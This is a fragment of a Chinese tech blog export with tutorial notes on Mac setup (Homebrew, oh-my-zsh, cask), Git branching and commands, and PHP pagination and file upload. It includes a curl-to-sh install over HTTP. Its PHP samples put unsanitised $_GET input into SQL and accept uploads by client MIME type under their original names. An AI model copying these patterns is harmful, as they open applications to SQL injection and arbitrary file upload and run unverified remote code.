<figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$ </span>brew update                        <span class="comment">#更新brew可安装包，建议每次执行一下  </span></div><div class="line"></div><div class="line">update失败时  </div><div class="line"><span class="variable">$ </span>cd /usr/local</div><div class="line"><span class="variable">$ </span>git reset --hard</div><div class="line"><span class="variable">$ </span>git checkout</div><div class="line"></div><div class="line"><span class="variable">$ </span>brew search php55                  <span class="comment">#搜索php5.5   </span></div><div class="line"><span class="variable">$ </span>brew tap                           <span class="comment">#查看安装的扩展列表</span></div><div class="line"><span class="variable">$ </span>brew install php55                 <span class="comment">#安装php5.5</span></div><div class="line"><span class="variable">$ </span>brew remove  php55                 <span class="comment">#卸载php5.5</span></div><div class="line"><span class="variable">$ </span>brew upgrade php55                 <span class="comment">#升级php5.5</span></div><div class="line"><span class="variable">$ </span>brew options php55                 <span class="comment">#查看php5.5安装选项</span></div><div class="line"><span class="variable">$ </span>brew info    php55                 <span class="comment">#查看php5.5相关信息</span></div><div class="line"><span class="variable">$ </span>brew home    php55                 <span class="comment">#访问php5.5官方网站</span></div></pre></td></tr></table></figure>
<h2 id="二、Oh-My-Zsh"><a href="#二、Oh-My-Zsh" class="headerlink" title="二、Oh My Zsh"></a>二、Oh My Zsh</h2><p>目前常用的 Linux 系统和 OS X 系统的默认 Shell 都是 bash，但是真正强大的 Shell 是深藏不露的 zsh， 这货绝对是马车中的跑车，跑车中的飞行车，史称『终极 Shell』，但是由于配置过于复杂，所以初期无人问津，很多人跑过来看看 zsh 的配置指南，什么都不说转身就走了。直到有一天，国外有个穷极无聊的程序员开发出了一个能够让你快速上手的zsh项目，叫做 oh my zsh</p>
<p>1.设置默认shell</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ cat <span class="regexp">/etc/</span>shells</div><div class="line">$ chsh -s <span class="regexp">/bin/</span>zsh</div></pre></td></tr></table></figure>
<p>2.安装 oh my zsh</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">$</span> curl -L http:<span class="comment">//install.ohmyz.sh | sh</span></div></pre></td></tr></table></figure>
<h2 id="三、homebrew-cask"><a href="#三、homebrew-cask" class="headerlink" title="三、homebrew-cask"></a>三、homebrew-cask</h2><p>谈谈cask对比Mac App Store的优势：<br>1、对常用软件支持更全面（特别是开发者），cask里面会给你一些惊喜；<br>2、软件更新速度快，一般都是最新版本 Store上很久很久才会更新版本；<br>3、命令安装感觉比打开Store方便，另外Store在国内的速度也是XXOO。<br>安装cask：</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ <span class="keyword">brew </span>tap phinze/homebrew-cask &amp;&amp; <span class="keyword">brew </span>install <span class="keyword">brew-cask</span></div></pre></td></tr></table></figure>
<p>cask常用命令：</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$ </span>brew cask search               <span class="comment">#列出所有可以被安装的软件</span></div><div class="line"><span class="variable">$ </span>brew cask search php           <span class="comment">#查找所有和php相关的应用</span></div><div class="line"><span class="variable">$ </span>brew cask list                 <span class="comment">#列出所有通过cask安装的软件</span></div><div class="line"><span class="variable">$ </span>brew cask info phpstorm        <span class="comment">#查看 phpstorm 的信息</span></div><div class="line"><span class="variable">$ </span>brew cask uninstall qq         <span class="comment">#卸载 QQ</span></div></pre></td></tr></table></figure>
<p>安装开发常用的包&amp;软件<br>升级一下系统自带的vim</p>
<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">$</span> <span class="comment">brew</span> <span class="comment">install</span> <span class="comment">ctags</span> <span class="comment">macvim</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">env</span><span class="literal">-</span><span class="comment">std</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">override</span><span class="literal">-</span><span class="comment">system</span><span class="literal">-</span><span class="comment">vim</span></div></pre></td></tr></table></figure>
<p>安装常用软件</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ <span class="keyword">brew </span>cask <span class="keyword">install </span>alfred appcleaner firefox google-chrome phpstorm <span class="keyword">sublime-text </span>sequel-pro sketch mplayerx thunder qq</div></pre></td></tr></table></figure>
<h2 id="四、iTerm2"><a href="#四、iTerm2" class="headerlink" title="四、iTerm2"></a>四、iTerm2</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">brew </span>cask <span class="keyword">install </span>iterm2</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Mac </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Mac </tag>
            
            <tag> Homebrew </tag>
            
            <tag> Zsh </tag>
            
            <tag> iTerm2 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Git分支管理策略]]></title>
      <url>/2015/07/27/Tools/git%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/</url>
      <content type="html"><![CDATA[<p>Git有很多优点。其中很显著的一点，就是版本的分支（branch）和合并（merge）十分方便。Git只生成一个指向当前版本（又称”快照”）的指针.  </p>
<a id="more"></a>
<h2 id="一、主分支Master"><a href="#一、主分支Master" class="headerlink" title="一、主分支Master"></a>一、主分支Master</h2><p>首先，代码库应该有一个、且仅有一个主分支。所有提供给用户使用的正式版本，都在这个主分支上发布。Git主分支的名字，默认叫做Master。它是自动建立的，版本库初始化以后，默认就是在主分支在进行开发。<br><img src="/images/master.png" alt="master"></p>
<h2 id="二、开发分支Develop"><a href="#二、开发分支Develop" class="headerlink" title="二、开发分支Develop"></a>二、开发分支Develop</h2><p>主分支只用来分布重大版本，日常开发应该在另一条分支上完成。我们把开发用的分支，叫做Develop。<br><img src="/images/develop.png" alt="develp"></p>
<p>这个分支可以用来生成代码的最新隔夜版本（nightly）。如果想正式对外发布，就在Master分支上，对Develop分支进行”合并”（merge）。<br>Git创建Develop分支的命令：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git checkout -<span class="selector-tag">b</span> develop master</div></pre></td></tr></table></figure></p>
<p>将Develop分支发布到Master分支的命令：<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#切换到Master分支</span></div><div class="line">git checkout <span class="keyword">master</span></div><div class="line"><span class="title">#对Develop</span>分支进行合并</div><div class="line">git merge --no-ff develop</div></pre></td></tr></table></figure></p>
<p>使用—no-ff参数后，会执行正常合并，在Master分支上生成一个新节点。为了保证版本演进的清晰，我们希望采用这种做法.  </p>
<h2 id="三、临时性分支"><a href="#三、临时性分支" class="headerlink" title="三、临时性分支"></a>三、临时性分支</h2><p>前面讲到版本库的两条主要分支：Master和Develop。前者用于正式发布，后者用于日常开发。其实，常设分支只需要这两条就够了，不需要其他了。<br>但是，除了常设分支以外，还有一些临时性分支，用于应对一些特定目的的版本开发。临时性分支主要有三种：  </p>
<p>1、功能（feature）分支<br>2、预发布（release）分支<br>3、修补bug（fixbug）分支<br>这三种分支都属于临时性需要，使用完以后，应该删除，使得代码库的常设分支始终只有Master和Develop。  </p>
<h2 id="四、功能分支"><a href="#四、功能分支" class="headerlink" title="四、功能分支"></a>四、功能分支</h2><p>第一种是功能分支，它是为了开发某种特定功能，从Develop分支上面分出来的。开发完成后，要再并入Develop。<br><img src="/images/feature.png" alt="feature"></p>
<p>功能分支的名字，可以采用feature-*的形式命名<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">git checkout -b feature-<span class="keyword">x</span> develop</div><div class="line">git checkout develop</div><div class="line">git merge --no-ff feature-<span class="keyword">x</span></div><div class="line">git branch -d feature-<span class="keyword">x</span></div></pre></td></tr></table></figure></p>
<h2 id="五、预发布分支"><a href="#五、预发布分支" class="headerlink" title="五、预发布分支"></a>五、预发布分支</h2><p>第二种是预发布分支，它是指发布正式版本之前（即合并到Master分支之前），我们可能需要有一个预发布的版本进行测试。<br>预发布分支是从Develop分支上面分出来的，预发布结束以后，必须合并进Develop和Master分支。它的命名，可以采用release-*的形式。<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">git checkout -b release-<span class="number">1.2</span> develop</div><div class="line">git checkout <span class="keyword">master</span></div><div class="line"><span class="title">git</span> merge --no-ff release-<span class="number">1.2</span></div><div class="line"><span class="comment">#对合并生成的新节点，做一个标签</span></div><div class="line">git <span class="keyword">tag</span> <span class="title">-a</span> <span class="number">1.2</span></div><div class="line">git checkout develop</div><div class="line">git merge --no-ff release-<span class="number">1.2</span></div><div class="line">git branch -d release-<span class="number">1.2</span></div></pre></td></tr></table></figure></p>
<h2 id="六、修补bug分支"><a href="#六、修补bug分支" class="headerlink" title="六、修补bug分支"></a>六、修补bug分支</h2><p>最后一种是修补bug分支。软件正式发布以后，难免会出现bug。这时就需要创建一个分支，进行bug修补。<br>修补bug分支是从Master分支上面分出来的。修补结束以后，再合并进Master和Develop分支。它的命名，可以采用fixbug-*的形式。<br><img src="/images/bug.png" alt="bug"></p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">  </div><div class="line">git checkout -b fixbug-<span class="number">0.1</span> <span class="keyword">master</span></div><div class="line"><span class="title">git</span> checkout <span class="keyword">master</span></div><div class="line"><span class="title">git</span> merge --no-ff fixbug-<span class="number">0.1</span></div><div class="line">git <span class="keyword">tag</span> <span class="title">-a</span> <span class="number">0.1</span>.<span class="number">1</span></div><div class="line">git checkout develop</div><div class="line">git merge --no-ff fixbug-<span class="number">0.1</span></div><div class="line">git branch -d fixbug-<span class="number">0.1</span></div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Tools </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Git </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Git命令]]></title>
      <url>/2015/07/26/Tools/git%E5%91%BD%E4%BB%A4/</url>
      <content type="html"><![CDATA[<p>速度 简单的设计 完全分布式<br>对非线性开发模式的强力支持（允许上千个并行开发的分支）<br>有能力高效管理超大规模项目（速度和数据量）  </p>
<a id="more"></a>
<h2 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h2><p>使用homebrew下载<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">brew </span><span class="keyword">install </span>git</div></pre></td></tr></table></figure></p>
<h2 id="二、配置"><a href="#二、配置" class="headerlink" title="二、配置"></a>二、配置</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ git config --global user<span class="selector-class">.name</span> <span class="string">"用户名"</span></div><div class="line">$ git config --global user<span class="selector-class">.email</span> <span class="string">"邮箱"</span>  </div></pre></td></tr></table></figure>
<h2 id="三、初始化仓库"><a href="#三、初始化仓库" class="headerlink" title="三、初始化仓库"></a>三、初始化仓库</h2><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ git init</div><div class="line">$ git remote add origin 地址</div><div class="line">$ git pull origin <span class="keyword">master</span>  </div><div class="line"><span class="title">或者</span></div><div class="line">$ git <span class="keyword">clone</span> <span class="title">git</span>://github.com/schacon/grit.git</div></pre></td></tr></table></figure>
<h2 id="四、常用命令"><a href="#四、常用命令" class="headerlink" title="四、常用命令"></a>四、常用命令</h2><p>将文件从工作目录添加到缓存区<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ git <span class="keyword">add</span><span class="bash"> 文件名</span></div></pre></td></tr></table></figure></p>
<p>查看状态<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$ </span>git status</div></pre></td></tr></table></figure></p>
<p>提交到本地仓库<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$ </span>git commit -m “说明”</div></pre></td></tr></table></figure></p>
<p>上传到远程仓库<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ git <span class="built_in">push</span> <span class="built_in">origin</span> 分支名</div></pre></td></tr></table></figure></p>
<p>将远程仓库数据同步到本地仓库<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$ </span>git fetch origin</div></pre></td></tr></table></figure></p>
<p>创建分支<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ git <span class="keyword">branch </span>分支名 远程分支名</div></pre></td></tr></table></figure></p>
<p>切换分支<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$ </span>git checkout 分支名</div></pre></td></tr></table></figure></p>
<p>删除本地分支<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ git <span class="keyword">branch </span>-d 分支名</div></pre></td></tr></table></figure></p>
<p>删除远程分支<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ git <span class="built_in">push</span> <span class="built_in">origin</span> :分支名</div></pre></td></tr></table></figure></p>
<p>合并分支<br><figure class="highlight gams"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">$</span> git merge --<span class="keyword">no</span>-ff 分支名</div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> Tools </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Git </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PHP+Mysql分页原理]]></title>
      <url>/2015/04/20/PHP/PHP+Mysql%E5%88%86%E9%A1%B5%E5%8E%9F%E7%90%86/</url>
      <content type="html"><![CDATA[<p>1、limit用法<br>2、分页公式<br>3、解析url  </p>
<a id="more"></a>
<h2 id="一、limit用法"><a href="#一、limit用法" class="headerlink" title="一、limit用法"></a>一、limit用法</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">table</span> <span class="keyword">limit</span> 开始位置 , 操作条数</div><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">table</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">20</span></div></pre></td></tr></table></figure>
<h2 id="二、分页公式"><a href="#二、分页公式" class="headerlink" title="二、分页公式"></a>二、分页公式</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">table</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">10</span></div><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">table</span> <span class="keyword">limit</span> <span class="number">10</span>,<span class="number">10</span></div><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">table</span> <span class="keyword">limit</span> <span class="number">20</span>,<span class="number">10</span></div><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">table</span> <span class="keyword">limit</span> ($page<span class="number">-1</span>)*$pagesize,$pagesize</div></pre></td></tr></table></figure>
<h2 id="三、parse-url-解析URL函数"><a href="#三、parse-url-解析URL函数" class="headerlink" title="三、parse_url()解析URL函数"></a>三、parse_url()解析URL函数</h2><figure class="highlight pf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$ua</span>=parse_url(<span class="string">"http://username:password@hostname/path?arg=value#anchor"</span>); </div><div class="line">print_r(<span class="variable">$ua</span>);</div><div class="line">结果:</div><div class="line">Array</div><div class="line">(</div><div class="line">[scheme] =&gt; http </div><div class="line">[host] =&gt; hostname </div><div class="line">[<span class="keyword">user</span>] =&gt; username </div><div class="line">[<span class="built_in">pass</span>] =&gt; password </div><div class="line">[path] =&gt; /path </div><div class="line">[query] =&gt; arg=value </div><div class="line">[<span class="keyword">fragment</span>] =&gt; <span class="built_in">anchor</span></div><div class="line">)</div></pre></td></tr></table></figure>
<h2 id="四、简单分页效果"><a href="#四、简单分页效果" class="headerlink" title="四、简单分页效果"></a>四、简单分页效果</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$pagesize</span>=5;</div><div class="line"><span class="variable">$url</span>=<span class="variable">$_SERVER</span>[<span class="string">"REQUEST_URI"</span>];</div><div class="line"><span class="variable">$url</span>=parse_url(<span class="variable">$url</span>);</div><div class="line"><span class="variable">$url</span>=<span class="variable">$url</span>[path];</div><div class="line"></div><div class="line"><span class="variable">$numq</span>=mysql_query(<span class="string">"SELECT * FROM `test`"</span>);</div><div class="line"><span class="variable">$num</span> = mysql_num_rows(<span class="variable">$numq</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[page])&#123;</div><div class="line"><span class="variable">$pageval</span>=<span class="variable">$_GET</span>[page];</div><div class="line"><span class="variable">$page</span>=(<span class="variable">$pageval</span>-1)*<span class="variable">$pagesize</span>;</div><div class="line"><span class="variable">$page</span>.=<span class="string">','</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>(<span class="variable">$num</span> &gt; <span class="variable">$pagesize</span>)&#123;</div><div class="line">	<span class="keyword">if</span>(<span class="variable">$pageval</span>&lt;=1)</div><div class="line">	<span class="variable">$pageval</span>=1;</div><div class="line">	<span class="built_in">echo</span> <span class="string">"第 <span class="variable">$num</span> 条"</span>.<span class="string">" &lt;a href=<span class="variable">$url</span>?page="</span>.(<span class="variable">$pageval</span>-1).<span class="string">"&gt;前一页&lt;/a&gt; &lt;a href=<span class="variable">$url</span>?page="</span>.(<span class="variable">$pageval</span>+1).<span class="string">"&gt;后一页&lt;/a&gt;"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="built_in">echo</span>  <span class="variable">$SQL</span>=<span class="string">"SELECT * FROM `test` limit <span class="variable">$page</span> <span class="variable">$pagesize</span> "</span>;</div><div class="line"><span class="variable">$query</span>=mysql_query(<span class="variable">$SQL</span>);</div><div class="line"><span class="keyword">while</span>(<span class="variable">$row</span>=mysql_fetch_array(<span class="variable">$query</span>))&#123;</div><div class="line">	<span class="built_in">echo</span> <span class="string">"&lt;hr&gt;&lt;b&gt;"</span>.<span class="variable">$row</span>[name].<span class="string">" | "</span>.<span class="variable">$row</span>[sex];</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> PHP </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PHP上传原理]]></title>
      <url>/2015/04/15/PHP/PHP%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86/</url>
      <content type="html"><![CDATA[<p>1、FORM标签enctype属性<br>2、$_FILES 系统函数<br>3、move_uploaded_file函数<br>4、is_uploaded_file 函数  </p>
<a id="more"></a>  
<h2 id="一、form标签"><a href="#一、form标签" class="headerlink" title="一、form标签"></a>一、form标签</h2><p>表单中enctype=”multipart/form-data”的意思,是设置表单的MIME编码。默认情况, 这个编码格式是application/x-www-form-urlencoded,不能用于文件上传; 只有使⽤用了multipart/form-data,才能完整的传递⽂件数据<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;<span class="selector-tag">form</span> enctype=<span class="string">"multipart/form-data"</span> &gt;</div><div class="line">&lt;<span class="selector-tag">input</span> type=<span class="string">"file"</span>&gt;</div></pre></td></tr></table></figure></p>
<h2 id="二、-FILES-系统函数"><a href="#二、-FILES-系统函数" class="headerlink" title="二、$_FILES 系统函数"></a>二、$_FILES 系统函数</h2><p>1、$_FILES[‘myFile’][‘name’] 客户端文件的原名称。  </p>
<p>2、$_FILES[‘myFile’][‘type’] 文件的 MIME 类型。<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">image</span>/jpg</div><div class="line"><span class="built_in">image</span>/jpeg</div><div class="line"><span class="built_in">image</span>/png</div><div class="line"><span class="built_in">image</span>/pjpeg</div><div class="line"><span class="built_in">image</span>/gif</div><div class="line"><span class="built_in">image</span>/bmp</div><div class="line"><span class="built_in">image</span>/x-png application/x-zip-compressed</div></pre></td></tr></table></figure><br>3、$_FILES[‘myFile’][‘size’] 已上传文件的⼤⼩,单位为字节。</p>
<p>4、$_FILES[‘myFile’][‘tmp_name’] 储存的临时文件名,⼀一般是系统默认。  </p>
<p>5、$_FILES[‘myFile’][‘error’] 文件上传相关的错误代码。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>; 文件上传成功。  </div><div class="line"><span class="number">1</span>; 超过了⽂件⼤⼩php.ini中。   </div><div class="line"><span class="number">2</span>; 超过了⽂件大小MAX_FILE_SIZE 选项指定的值。   </div><div class="line"><span class="number">3</span>; ⽂件只有部分被上传。  </div><div class="line"><span class="number">4</span>; 没有文件被上传。  </div><div class="line"><span class="number">5</span>; 上传⽂件大小为<span class="number">0</span>。  </div></pre></td></tr></table></figure></p>
<h2 id="三、move-uploaded-file函数"><a href="#三、move-uploaded-file函数" class="headerlink" title="三、move_uploaded_file函数"></a>三、move_uploaded_file函数</h2><p>上传后移动⽂件到目标位置的函数<br><figure class="highlight gcode"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">move_uploaded_file<span class="comment">(临时⽂件,⽬标位置和文件名)</span>;</div></pre></td></tr></table></figure></p>
<h2 id="四、is-uploaded-file函数"><a href="#四、is-uploaded-file函数" class="headerlink" title="四、is_uploaded_file函数"></a>四、is_uploaded_file函数</h2><p>判断上传MIME类型的文件函数<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">is_uploaded_file(<span class="name">MIME</span>)<span class="comment">;</span></div></pre></td></tr></table></figure></p>
<h2 id="五、简单上传"><a href="#五、简单上传" class="headerlink" title="五、简单上传"></a>五、简单上传</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (is_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">'upfile'</span>][<span class="string">'tmp_name'</span>]))&#123;</div><div class="line"></div><div class="line"><span class="variable">$upfile</span>=<span class="variable">$_FILES</span>[<span class="string">"upfile"</span>];</div><div class="line"></div><div class="line"><span class="variable">$name</span> = <span class="variable">$upfile</span>[<span class="string">"name"</span>];</div><div class="line"><span class="variable">$type</span> = <span class="variable">$upfile</span>[<span class="string">"type"</span>];</div><div class="line"><span class="variable">$size</span> = <span class="variable">$upfile</span>[<span class="string">"size"</span>];</div><div class="line"><span class="variable">$tmp_name</span> = <span class="variable">$upfile</span>[<span class="string">"tmp_name"</span>];</div><div class="line"><span class="variable">$error</span> = <span class="variable">$upfile</span>[<span class="string">"error"</span>];</div><div class="line"></div><div class="line"></div><div class="line">switch (<span class="variable">$type</span>) &#123;</div><div class="line">	<span class="keyword">case</span> <span class="string">'image/pjpeg'</span> : <span class="variable">$ok</span>=1;</div><div class="line">		<span class="built_in">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="string">'image/jpeg'</span> : <span class="variable">$ok</span>=1;</div><div class="line">		<span class="built_in">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="string">'image/gif'</span> : <span class="variable">$ok</span>=1;</div><div class="line">		<span class="built_in">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="string">'image/png'</span> : <span class="variable">$ok</span>=1;</div><div class="line">		<span class="built_in">break</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="variable">$ok</span> &amp;&amp; <span class="variable">$error</span>==<span class="string">'0'</span>)&#123;</div><div class="line"> move_uploaded_file(<span class="variable">$tmp_name</span>,<span class="string">'up/'</span>.<span class="variable">$name</span>);</div><div class="line"> <span class="built_in">echo</span> <span class="string">"上传成功"</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">&lt;form action=<span class="string">""</span> enctype=<span class="string">"multipart/form-data"</span> method=<span class="string">"post"</span> name=<span class="string">"upform"</span>&gt;</div><div class="line">  上传文件:</div><div class="line">  &lt;input name=<span class="string">"upfile"</span> <span class="built_in">type</span>=<span class="string">"file"</span>&gt;</div><div class="line">  &lt;input <span class="built_in">type</span>=<span class="string">"submit"</span> value=<span class="string">"上传"</span>&gt;&lt;br&gt;</div><div class="line">&lt;/form&gt;</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> PHP </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PHP随笔记]]></title>
      <url>/2015/04/10/PHP/PHP%E9%9A%8F%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p>长字符串<br>空类型<br>系统常量<br>运算符  </p>
<a id="more"></a>
<p>1、长字符串<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">　　$<span class="built_in">string</span> = &lt;&lt;&lt;GOD字符串GOD;</div></pre></td></tr></table></figure></p>
<p>　　在赋值符号后，输入定界符“&lt;&lt;&lt;”,接着是标识符，你可以用你的女神作为标识符“GOD”，如第2行，也可以使用你喜欢的狗狗，“DOG”作为标识符，但是，结尾处的标识符也必须是一样的。此外，在结尾的一行，如第7行，一定要另起一行，并且此行除了“GOD”，并以“；”号结束之外，不能有任何其他字符，前后都不能有，包括空格，否则会出现错误的哦。切记切记哦。<br>　　<br>2、空类型<br>　　NULL是空类型，对大小写不敏感，NULL类型只有一个取值，表示一个变量没有值，当被赋值为NULL，或者尚未被赋值，或者被unset()，这三种情况下变量被认为为NULL。<br>　　<br>3、禁止显示PHP警告提示<br><figure class="highlight abnf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">　　error_repoting(<span class="number">0</span>)<span class="comment">;</span></div></pre></td></tr></table></figure><br>　　<br>4、定义常量<br><figure class="highlight lasso"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">　　<span class="class"><span class="keyword">define</span></span>(<span class="string">"标识符"</span>，值);</div></pre></td></tr></table></figure></p>
